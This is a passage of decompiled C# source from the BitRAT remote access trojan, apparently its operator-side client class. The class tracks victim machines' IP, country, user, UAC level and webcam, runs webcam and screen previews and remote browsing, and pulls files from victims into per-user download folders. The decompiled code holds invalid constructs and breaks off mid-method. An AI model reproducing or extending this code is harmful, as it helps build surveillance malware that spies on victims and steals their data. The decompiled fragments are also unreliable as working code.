﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;

namespace BitRAT
{
	// Token: 0x020001D2 RID: 466
	public class CClient
	{
		// Token: 0x0600198D RID: 6541 RVA: 0x000B7DF0 File Offset: 0x000B5FF0
		public CClient(ref fMain ff, string sSocketID, GClass1 sck_async, bool SSL)
		{
			this.sCountry = "N/A";
			this.sWindowTitle = "N/A";
			this.sUser = "N/A";
			this.sSystem = "N/A";
			this.sIdle = "N/A";
			this.sIdleMs = "N/A";
			this.sWebcam = "N/A";
			this.sInOut = "N/A";
			this.sSpeed = "N/A";
			this.sLANIP = "N/A";
			this.sBandwidthDL = "N/A";
			this.sCam = "N/A";
			this.sPing = "N/A";
			this.sCPUusage = "N/A";
			this.sRAM = "N/A";
			this.sUACLevel = "N/A";
			this.sPacket = new StringBuilder();
			this.mPacket = new MemoryStream();
			this.pending_dc = false;
			this.pending_dc_timeout = false;
			this.FILE_TRANSFER_LAST_PACKET = 0L;
			this.FILE_TRANSFER_DL_DATA = new MemoryStream();
			this.WavePlaybackStopped = null;
			this.sKey = sSocketID;
			IPEndPoint ipendPoint = (IPEndPoint)sck_async.socket_0.RemoteEndPoint;
			this.sIP = ipendPoint.Address.ToString();
			this.sPort = ipendPoint.Port.ToString();
			this.sock_async = sck_async;
			this.mSocketCounter = Class136.smethod_6();
			this.mIndex = string.Empty;
			this.ff = ff;
			this.sPacket.Clear();
			this.sCountry = string.Empty;
			Class136.Struct27 @struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			bool flag = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag = true;
			}
			long num;
			if (flag)
			{
				num = Class136.GetTickCount64();
			}
			else
			{
				num = (long)Class136.GetTickCount();
			}
			long num2 = num;
			this.lLastSignal = num2;
			this.lSockTimeout = 30000L;
			checked
			{
				if (SSL)
				{
					this.IS_SSL = true;
					sck_async.sslStream_0.ReadTimeout = (int)this.lSockTimeout;
					sck_async.sslStream_0.WriteTimeout = (int)this.lSockTimeout;
					SslProtocols sslProtocol = sck_async.sslStream_0.SslProtocol;
					if (sslProtocol <= SslProtocols.Ssl3)
					{
						if (sslProtocol != SslProtocols.Ssl2)
						{
							if (sslProtocol == SslProtocols.Ssl3)
							{
								this.SSL_PROTOCOL = "SSL 3.0";
								this.SSL_CIPHERSUITE = "SSL_";
							}
						}
						else
						{
							this.SSL_PROTOCOL = "SSL 2.0";
							this.SSL_CIPHERSUITE = "SSL_";
						}
					}
					else if (sslProtocol != SslProtocols.Tls)
					{
						if (sslProtocol != SslProtocols.Tls11)
						{
							if (sslProtocol == SslProtocols.Tls12)
							{
								this.SSL_PROTOCOL = "TLS 1.2";
								this.SSL_CIPHERSUITE = "TLS_";
							}
						}
						else
						{
							this.SSL_PROTOCOL = "TLS 1.1";
							this.SSL_CIPHERSUITE = "TLS_";
						}
					}
					else
					{
						this.SSL_PROTOCOL = "TLS 1.0";
						this.SSL_CIPHERSUITE = "TLS_";
					}
					ExchangeAlgorithmType keyExchangeAlgorithm = sck_async.sslStream_0.KeyExchangeAlgorithm;
					string ptr;
					if (keyExchangeAlgorithm <= ExchangeAlgorithmType.RsaKeyX)
					{
						if (keyExchangeAlgorithm != ExchangeAlgorithmType.RsaSign)
						{
							if (keyExchangeAlgorithm == ExchangeAlgorithmType.RsaKeyX)
							{
								this.SSL_KEYEXCHANGE = "RSA-" + Conversions.ToString(sck_async.sslStream_0.KeyExchangeStrength);
								ptr = ref this.SSL_CIPHERSUITE;
								this.SSL_CIPHERSUITE = ptr + "RSA_WITH_";
							}
						}
						else
						{
							this.SSL_KEYEXCHANGE = "RSA-" + Conversions.ToString(sck_async.sslStream_0.KeyExchangeStrength);
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "RSA_WITH_";
						}
					}
					else if (keyExchangeAlgorithm != ExchangeAlgorithmType.DiffieHellman)
					{
						if (keyExchangeAlgorithm == (ExchangeAlgorithmType)44550)
						{
							this.SSL_KEYEXCHANGE = "ECDHE-" + Conversions.ToString(sck_async.sslStream_0.KeyExchangeStrength);
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "ECDHE_RSA_WITH_";
						}
					}
					else
					{
						this.SSL_KEYEXCHANGE = "DH-" + Conversions.ToString(sck_async.sslStream_0.KeyExchangeStrength);
						ptr = ref this.SSL_CIPHERSUITE;
						this.SSL_CIPHERSUITE = ptr + "DHE_RSA_WITH_";
					}
					CipherAlgorithmType cipherAlgorithm = sck_async.sslStream_0.CipherAlgorithm;
					switch (cipherAlgorithm)
					{
					case CipherAlgorithmType.Des:
						this.SSL_CIPHER = "DES-" + Conversions.ToString(sck_async.sslStream_0.CipherStrength);
						ptr = ref this.SSL_CIPHERSUITE;
						this.SSL_CIPHERSUITE = ptr + "DES_" + Conversions.ToString(sck_async.sslStream_0.CipherStrength) + "_GCM_";
						break;
					case CipherAlgorithmType.Rc2:
						this.SSL_CIPHER = "RC2-" + Conversions.ToString(sck_async.sslStream_0.CipherStrength);
						ptr = ref this.SSL_CIPHERSUITE;
						this.SSL_CIPHERSUITE = ptr + "RC2_" + Conversions.ToString(sck_async.sslStream_0.CipherStrength) + "_GCM_";
						break;
					case CipherAlgorithmType.TripleDes:
						this.SSL_CIPHER = "3DES-" + Conversions.ToString(sck_async.sslStream_0.CipherStrength);
						ptr = ref this.SSL_CIPHERSUITE;
						this.SSL_CIPHERSUITE = ptr + "3DES_" + Conversions.ToString(sck_async.sslStream_0.CipherStrength) + "_GCM_";
						break;
					default:
						switch (cipherAlgorithm)
						{
						case CipherAlgorithmType.Aes128:
							this.SSL_CIPHER = "AES-128";
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "AES_128_GCM_";
							break;
						case CipherAlgorithmType.Aes192:
							this.SSL_CIPHER = "AES-192";
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "AES_192_GCM_";
							break;
						case CipherAlgorithmType.Aes256:
							this.SSL_CIPHER = "AES-256";
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "AES_256_GCM_";
							break;
						case CipherAlgorithmType.Aes:
							this.SSL_CIPHER = "AES-" + Conversions.ToString(sck_async.sslStream_0.CipherStrength);
							ptr = ref this.SSL_CIPHERSUITE;
							this.SSL_CIPHERSUITE = ptr + "AES_" + Conversions.ToString(sck_async.sslStream_0.CipherStrength) + "_GCM_";
							break;
						default:
							if (cipherAlgorithm == CipherAlgorithmType.Rc4)
							{
								this.SSL_CIPHER = "RC4-" + Conversions.ToString(sck_async.sslStream_0.CipherStrength);
								ptr = ref this.SSL_CIPHERSUITE;
								this.SSL_CIPHERSUITE = ptr + "RC4_" + Conversions.ToString(sck_async.sslStream_0.CipherStrength) + "_GCM_";
							}
							break;
						}
						break;
					}
					HashAlgorithmType hashAlgorithm = sck_async.sslStream_0.HashAlgorithm;
					if (hashAlgorithm == HashAlgorithmType.Md5)
					{
						this.SSL_HASH = "MD5";
						ptr = ref this.SSL_CIPHERSUITE;
						this.SSL_CIPHERSUITE = ptr + "MD5";
						return;
					}
					if (hashAlgorithm != HashAlgorithmType.Sha1)
					{
						return;
					}
					this.SSL_HASH = "SHA1";
					ptr = ref this.SSL_CIPHERSUITE;
					this.SSL_CIPHERSUITE = ptr + "SHA";
				}
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600198E RID: 6542 RVA: 0x0000CB46 File Offset: 0x0000AD46
		// (set) Token: 0x0600198F RID: 6543 RVA: 0x000B8480 File Offset: 0x000B6680
		private virtual AsioOut WavePlaybackStopped
		{
			[CompilerGenerated]
			get
			{
				return this._WavePlaybackStopped;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler<StoppedEventArgs> eventHandler = new EventHandler<StoppedEventArgs>(this.WPlaybackStopped);
				AsioOut wavePlaybackStopped = this._WavePlaybackStopped;
				if (wavePlaybackStopped != null)
				{
					wavePlaybackStopped.PlaybackStopped -= eventHandler;
				}
				this._WavePlaybackStopped = value;
				wavePlaybackStopped = this._WavePlaybackStopped;
				if (wavePlaybackStopped != null)
				{
					wavePlaybackStopped.PlaybackStopped += eventHandler;
				}
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06001990 RID: 6544 RVA: 0x0000CB4E File Offset: 0x0000AD4E
		// (set) Token: 0x06001991 RID: 6545 RVA: 0x0000CB56 File Offset: 0x0000AD56
		public Image ICO_FLAG
		{
			get
			{
				return this.img_flag;
			}
			set
			{
				this.img_flag = value;
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06001992 RID: 6546 RVA: 0x0000CB5F File Offset: 0x0000AD5F
		// (set) Token: 0x06001993 RID: 6547 RVA: 0x0000CB67 File Offset: 0x0000AD67
		public Image ICO_TYPE
		{
			get
			{
				return this.img_type;
			}
			set
			{
				this.img_type = value;
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06001994 RID: 6548 RVA: 0x0000CB70 File Offset: 0x0000AD70
		// (set) Token: 0x06001995 RID: 6549 RVA: 0x0000CB78 File Offset: 0x0000AD78
		public Image ICO_STATUS
		{
			get
			{
				return this.img_status;
			}
			set
			{
				this.img_status = value;
			}
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06001996 RID: 6550 RVA: 0x0000CB81 File Offset: 0x0000AD81
		// (set) Token: 0x06001997 RID: 6551 RVA: 0x0000CB89 File Offset: 0x0000AD89
		public Image ICO_CON
		{
			get
			{
				return this.img_con;
			}
			set
			{
				this.img_con = value;
			}
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06001998 RID: 6552 RVA: 0x0000CB92 File Offset: 0x0000AD92
		// (set) Token: 0x06001999 RID: 6553 RVA: 0x0000CB9A File Offset: 0x0000AD9A
		public Image ICO_TMB
		{
			get
			{
				return this.img_tmb;
			}
			set
			{
				this.img_tmb = value;
			}
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600199A RID: 6554 RVA: 0x0000CBA3 File Offset: 0x0000ADA3
		// (set) Token: 0x0600199B RID: 6555 RVA: 0x0000CBDB File Offset: 0x0000ADDB
		public string IP
		{
			get
			{
				return string.Concat(new string[]
				{
					this.sIP,
					":",
					this.sPort,
					"@",
					this.sLANIP
				});
			}
			set
			{
				this.sIP = value;
			}
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600199C RID: 6556 RVA: 0x0000CBE4 File Offset: 0x0000ADE4
		// (set) Token: 0x0600199D RID: 6557 RVA: 0x0000CBEC File Offset: 0x0000ADEC
		public string LANIP
		{
			get
			{
				return this.sLANIP;
			}
			set
			{
				this.sLANIP = value;
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600199E RID: 6558 RVA: 0x0000CBF5 File Offset: 0x0000ADF5
		// (set) Token: 0x0600199F RID: 6559 RVA: 0x0000CBFD File Offset: 0x0000ADFD
		public string SYS_SHORT
		{
			get
			{
				return this.sSystem;
			}
			set
			{
				this.sSystem = value;
			}
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x060019A0 RID: 6560 RVA: 0x0000CC06 File Offset: 0x0000AE06
		// (set) Token: 0x060019A1 RID: 6561 RVA: 0x0000CC0E File Offset: 0x0000AE0E
		public string USER
		{
			get
			{
				return this.sUser;
			}
			set
			{
				this.sUser = value;
			}
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060019A2 RID: 6562 RVA: 0x0000CC17 File Offset: 0x0000AE17
		// (set) Token: 0x060019A3 RID: 6563 RVA: 0x0000CC1F File Offset: 0x0000AE1F
		public string SETTINGPASSWORD
		{
			get
			{
				return this.sSettingPassword;
			}
			set
			{
				this.sSettingPassword = value;
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060019A4 RID: 6564 RVA: 0x0000CC28 File Offset: 0x0000AE28
		// (set) Token: 0x060019A5 RID: 6565 RVA: 0x0000CC30 File Offset: 0x0000AE30
		public string OS
		{
			get
			{
				return this.sOperatingSystem;
			}
			set
			{
				this.sOperatingSystem = value;
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060019A6 RID: 6566 RVA: 0x0000CC39 File Offset: 0x0000AE39
		// (set) Token: 0x060019A7 RID: 6567 RVA: 0x0000CC41 File Offset: 0x0000AE41
		public string AV
		{
			get
			{
				return this.sWindowTitle;
			}
			set
			{
				this.sWindowTitle = value;
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060019A8 RID: 6568 RVA: 0x0000CC4A File Offset: 0x0000AE4A
		// (set) Token: 0x060019A9 RID: 6569 RVA: 0x0000CC52 File Offset: 0x0000AE52
		public string IDLE
		{
			get
			{
				return this.sIdle;
			}
			set
			{
				this.sIdle = value;
			}
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060019AA RID: 6570 RVA: 0x0000CC5B File Offset: 0x0000AE5B
		// (set) Token: 0x060019AB RID: 6571 RVA: 0x0000CC63 File Offset: 0x0000AE63
		public string INOUT
		{
			get
			{
				return this.sInOut;
			}
			set
			{
				this.sInOut = value;
			}
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x060019AC RID: 6572 RVA: 0x0000CC6C File Offset: 0x0000AE6C
		// (set) Token: 0x060019AD RID: 6573 RVA: 0x0000CC74 File Offset: 0x0000AE74
		public string SPEED
		{
			get
			{
				return this.sSpeed;
			}
			set
			{
				this.sSpeed = value;
			}
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x060019AE RID: 6574 RVA: 0x0000CC7D File Offset: 0x0000AE7D
		// (set) Token: 0x060019AF RID: 6575 RVA: 0x0000CC85 File Offset: 0x0000AE85
		public string BANDWIDTHDL
		{
			get
			{
				return this.sBandwidthDL;
			}
			set
			{
				this.sBandwidthDL = value;
			}
		}

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x060019B0 RID: 6576 RVA: 0x0000CC8E File Offset: 0x0000AE8E
		// (set) Token: 0x060019B1 RID: 6577 RVA: 0x0000CC96 File Offset: 0x0000AE96
		public string CAM
		{
			get
			{
				return this.sWebcam;
			}
			set
			{
				this.sWebcam = value;
			}
		}

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x060019B2 RID: 6578 RVA: 0x0000CC9F File Offset: 0x0000AE9F
		// (set) Token: 0x060019B3 RID: 6579 RVA: 0x0000CCC5 File Offset: 0x0000AEC5
		public string COUNTRY
		{
			get
			{
				if (Operators.CompareString(this.sCountry, "ZZ", true) == 0)
				{
					this.sCountry = "N/A";
				}
				return this.sCountry;
			}
			set
			{
				this.sCountry = value;
			}
		}

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x060019B4 RID: 6580 RVA: 0x0000CCCE File Offset: 0x0000AECE
		// (set) Token: 0x060019B5 RID: 6581 RVA: 0x0000CCD6 File Offset: 0x0000AED6
		public string PING
		{
			get
			{
				return this.sPing;
			}
			set
			{
				this.sPing = value;
			}
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x060019B6 RID: 6582 RVA: 0x0000CCDF File Offset: 0x0000AEDF
		// (set) Token: 0x060019B7 RID: 6583 RVA: 0x0000CCE7 File Offset: 0x0000AEE7
		public string CPU_USAGE
		{
			get
			{
				return this.sCPUusage;
			}
			set
			{
				this.sCPUusage = value;
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x060019B8 RID: 6584 RVA: 0x0000CCF0 File Offset: 0x0000AEF0
		// (set) Token: 0x060019B9 RID: 6585 RVA: 0x0000CCF8 File Offset: 0x0000AEF8
		public string RAM
		{
			get
			{
				return this.sRAM;
			}
			set
			{
				this.sRAM = value;
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x060019BA RID: 6586 RVA: 0x0000CD01 File Offset: 0x0000AF01
		// (set) Token: 0x060019BB RID: 6587 RVA: 0x0000CD09 File Offset: 0x0000AF09
		public string UACLEVEL
		{
			get
			{
				return this.sUACLevel;
			}
			set
			{
				this.sUACLevel = value;
			}
		}

		// Token: 0x060019BC RID: 6588 RVA: 0x000B84C4 File Offset: 0x000B66C4
		public void SOCKET_DISCONNECT(ref bool bCleanUp)
		{
			try
			{
				this.sock_async.method_7();
			}
			catch (Exception ex)
			{
			}
			checked
			{
				if (bCleanUp)
				{
					if (this.FILE_TRANSFER_ACTIVE)
					{
						try
						{
							if (!this.FILE_TRANSFER_COMPLETED)
							{
								bool flag = false;
								bool flag2;
								byte[] byte_;
								string string_;
								Class136.Class142 @class;
								if (File.Exists(string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									this.FILE_TRANSFER_USER,
									"\\",
									this.FILE_TRANSFER_FILENAME
								})))
								{
									string text = string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										this.FILE_TRANSFER_USER,
										"\\",
										this.FILE_TRANSFER_FILENAME
									});
									byte[] array = this.FILE_TRANSFER_DL_DATA.ToArray();
									flag2 = true;
									byte_ = array;
									string_ = text;
									@class = new Class136.Class142();
									@class.string_0 = string_;
									@class.byte_0 = byte_;
									@class.bool_0 = true;
									try
									{
										if (flag2)
										{
											new Thread(new ThreadStart(@class._Lambda$__0)).Start();
										}
										else
										{
											Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
										}
										goto IL_1E9;
									}
									catch (Exception ex2)
									{
										goto IL_1E9;
									}
								}
								string text2 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									this.FILE_TRANSFER_USER,
									"\\",
									this.FILE_TRANSFER_FILENAME
								});
								byte[] array2 = this.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array2;
								string_ = text2;
								@class = new Class136.Class142();
								@class.string_0 = string_;
								@class.byte_0 = byte_;
								@class.bool_0 = false;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(@class._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
									}
								}
								catch (Exception ex3)
								{
								}
								IL_1E9:
								this.FILE_TRANSFER_DL_DATA.SetLength(0L);
								this.FILE_TRANSFER_ACTIVE = false;
								if (flag)
								{
									Class130.fTransferManager_0.method_16(this.FILE_TRANSFER_ID, 5, "Cancelled");
									Class130.concurrentDictionary_0[this.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									bool flag3 = true;
									this.SOCKET_DISCONNECT(ref flag3);
								}
								else
								{
									Class130.fTransferManager_0.method_16(this.FILE_TRANSFER_ID, 5, Conversions.ToString(Interaction.IIf(Class130.concurrentDictionary_0[this.FILE_TRANSFER_ID].SIZE_BYTES > 0L, "Failed", "Completed")));
									Class130.concurrentDictionary_0[this.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
								}
								Class130.long_3 -= 1L;
								if (Class130.long_3 < 0L)
								{
									Class130.long_3 = 0L;
								}
								Class130.fTransferManager_0.method_16(this.FILE_TRANSFER_ID, 7, "N/A");
								Class130.fTransferManager_0.method_17(this.FILE_TRANSFER_ID);
							}
							this.FILE_TRANSFER_DL_DATA.SetLength(0L);
							this.FILE_TRANSFER_DL_DATA.Close();
							this.FILE_TRANSFER_DL_DATA.Dispose();
							this.FILE_TRANSFER_DL_DATA = null;
							this.FILE_TRANSFER_ACTIVE = false;
							CClient cclient = null;
							Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient);
							return;
						}
						catch (Exception ex4)
						{
							return;
						}
					}
					if (this.WEBCAM_PREVIEW_ACTIVE)
					{
						CClient cclient2 = Class130.concurrentDictionary_3[this.WEBCAM_PREVIEW_USER_KEY];
						bool flag4 = false;
						CClient cclient3 = cclient2;
						try
						{
							if (cclient3.fPr != null && cclient3.fPr.Visible)
							{
								if (flag4)
								{
									cclient3.fPr.method_6();
								}
								cclient3.fPr.method_9();
								string text3 = cclient3.sKey;
								string string_2 = "webcam_preview_stop|1";
								string string_3 = text3;
								Class136.Class138 class2 = new Class136.Class138();
								class2.string_0 = string_3;
								class2.string_1 = string_2;
								class2.long_0 = 0L;
								try
								{
									if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
									{
										new Thread(new ThreadStart(class2._Lambda$__0)).Start();
									}
								}
								catch (Exception ex5)
								{
								}
							}
							cclient3.PREVIEW_WEBCAM_IS_ENABLED = false;
						}
						catch (Exception ex6)
						{
						}
						CClient cclient4 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient4);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					bool flag5;
					CClient cclient6;
					if (this.SCREEN_PREVIEW_ACTIVE)
					{
						CClient cclient5 = Class130.concurrentDictionary_3[this.SCREEN_PREVIEW_USER_KEY];
						flag5 = false;
						cclient6 = cclient5;
						try
						{
							if (cclient6.fPr != null && cclient6.fPr.Visible)
							{
								if (flag5)
								{
									cclient6.fPr.method_6();
								}
								string text4 = cclient6.sKey;
								string string_2 = "screen_preview_stop|1";
								string string_3 = text4;
								Class136.Class138 class2 = new Class136.Class138();
								class2.string_0 = string_3;
								class2.string_1 = string_2;
								class2.long_0 = 0L;
								try
								{
									if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
									{
										new Thread(new ThreadStart(class2._Lambda$__0)).Start();
									}
								}
								catch (Exception ex7)
								{
								}
								cclient6.fPr.vmethod_8().ForeColor = Color.Red;
								cclient6.fPr.vmethod_14().Text = "Disconnected";
								cclient6.fPr.vmethod_14().ForeColor = Color.Red;
							}
							cclient6.PREVIEW_SCREEN_IS_ENABLED = false;
						}
						catch (Exception ex8)
						{
						}
						CClient cclient7 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient7);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					if (this.SCREENLIVE_SECONDARY_ACTIVE)
					{
						CClient cclient8 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient8);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					if (this.SCREENLIVE_ACTIVE)
					{
						CClient cclient9 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient9);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					if (this.WEBCAMSTREAM_ACTIVE)
					{
						CClient cclient10 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient10);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					if (this.REMOTE_BROWSER_ACTIVE)
					{
						CClient cclient11 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient11);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					if (this.SOCKET_COMMAND_ACTIVE)
					{
						CClient cclient12 = null;
						Class130.concurrentDictionary_3.TryRemove(this.sKey, out cclient12);
						this.bJustConnected = false;
						this.pending_dc_timeout = false;
						this.pending_dc = true;
						return;
					}
					this.bJustConnected = false;
					this.pending_dc_timeout = false;
					this.pending_dc = true;
					flag5 = false;
					cclient6 = this;
					try
					{
						if (cclient6.fPr != null && cclient6.fPr.Visible)
						{
							if (flag5)
							{
								cclient6.fPr.method_6();
							}
							string text5 = cclient6.sKey;
							string string_2 = "screen_preview_stop|1";
							string string_3 = text5;
							Class136.Class138 class2 = new Class136.Class138();
							class2.string_0 = string_3;
							class2.string_1 = string_2;
							class2.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
								{
									new Thread(new ThreadStart(class2._Lambda$__0)).Start();
								}
							}
							catch (Exception ex9)
							{
							}
							cclient6.fPr.vmethod_8().ForeColor = Color.Red;
							cclient6.fPr.vmethod_14().Text = "Disconnected";
							cclient6.fPr.vmethod_14().ForeColor = Color.Red;
						}
						cclient6.PREVIEW_SCREEN_IS_ENABLED = false;
					}
					catch (Exception ex10)
					{
					}
					try
					{
						if (Class130.concurrentDictionary_3[this.sKey].fDB != null)
						{
							Class130.concurrentDictionary_3[this.sKey].fDB.method_0();
						}
					}
					catch (Exception ex11)
					{
					}
					this.ff.method_14(ref this.sKey, ref this.pending_dc, ref this.pending_dc_timeout);
					this.ff.method_15(ref this.sKey, ref this.pending_dc, ref this.pending_dc_timeout);
					this.ff.method_16(ref this.sKey, ref this.pending_dc, ref this.pending_dc_timeout);
					this.ff.method_17(ref this.sKey, ref this.pending_dc, ref this.pending_dc_timeout);
					this.ff.method_18(ref this.sKey, ref this.pending_dc, ref this.pending_dc_timeout);
				}
			}
		}

		// Token: 0x060019BD RID: 6589 RVA: 0x000B8E80 File Offset: 0x000B7080
		internal void REMOTE_BROWSER_FPS_UPDATE(double dSize)
		{
			if (this.fDB.vmethod_462().InvokeRequired)
			{
				this.fDB.vmethod_462().Invoke(new CClient.Delegate201(this.REMOTE_BROWSER_FPS_UPDATE), new object[]
				{
					dSize
				});
				return;
			}
			ref long ptr = ref this.lRemoteBrowserFPS;
			this.lRemoteBrowserFPS = checked(ptr + 1L);
			ref double ptr2 = ref this.dRemoteBrowserFPSAvgSize;
			this.dRemoteBrowserFPSAvgSize = ptr2 + dSize;
			if (this.lLastRemoteBrowserFrame > 0L)
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				if (checked(num - this.lLastRemoteBrowserFrame) >= 1000L)
				{
					Label label = this.fDB.vmethod_462();
					string[] array = new string[7];
					array[0] = "FPS: ";
					array[1] = Conversions.ToString(this.lRemoteBrowserFPS);
					array[2] = " (";
					int num2 = 3;
					double num3 = this.dRemoteBrowserFPSAvgSize;
					bool flag2 = false;
					ref bool ptr3 = ref flag2;
					double num4 = num3;
					int num5 = num2;
					string[] array2 = array;
					string[] array3 = array;
					Label label2 = label;
					int num6;
					string text2;
					int num7;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_298:
						goto IL_2E8;
						IL_29A:
						text2 = "0 B";
						goto IL_298;
						IL_2A3:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_2B9:;
					}
					catch when (endfilter(obj is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_2A3;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_2E8:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					Label label3 = label2;
					string[] array4 = array3;
					array2[num5] = text3;
					array4[4] = "/s @ ";
					int num8 = 5;
					double num9 = this.dRemoteBrowserFPSAvgSize / (double)this.lRemoteBrowserFPS;
					flag2 = false;
					ptr3 = ref flag2;
					num4 = num9;
					int num10 = num8;
					string[] array5 = array4;
					string[] array6 = array4;
					Label label4 = label3;
					object obj3;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_4A4:
						goto IL_4F4;
						IL_4A6:
						text2 = "0 B";
						goto IL_4A4;
						IL_4AF:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_4C5:;
					}
					catch when (endfilter(obj3 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex2 = (Exception)obj4;
						goto IL_4AF;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_4F4:
					if (num7 != 0)
					{
